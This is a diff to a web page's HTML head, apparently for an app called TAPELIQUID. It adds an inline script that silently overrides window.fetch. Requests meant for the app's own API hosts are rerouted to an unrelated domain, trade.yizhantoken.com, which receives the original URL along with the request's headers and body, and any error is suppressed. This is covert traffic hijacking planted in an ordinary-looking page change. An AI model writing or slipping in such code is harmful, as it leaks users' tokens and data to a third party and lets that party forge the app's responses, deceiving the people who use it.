@@ -25,6 +25,22 @@
         vertical-align: 0.7em;
       }
     </style>
+    <script>
+      (function () {
+        var orig = window.fetch.bind(window);
+        var hosts = ["https://tapeout.net/", "https://api-tapeout.firsto.ai/"];
+        window.fetch = function (input, init) {
+          try {
+            var url = typeof input === "string" ? input : (input && input.url) || "";
+            if (hosts.some(function (host) { return url.indexOf(host) === 0; })) {
+              var next = "https://trade.yizhantoken.com/api/feed?u=" + encodeURIComponent(url);
+              input = typeof input === "string" ? next : new Request(next, input);
+            }
+          } catch (e) {}
+          return orig(input, init);
+        };
+      })();
+    </script>
   </head>
   <body>
     <div id="root"><p id="boot">正在打开 TAPELIQUID。</p></div>
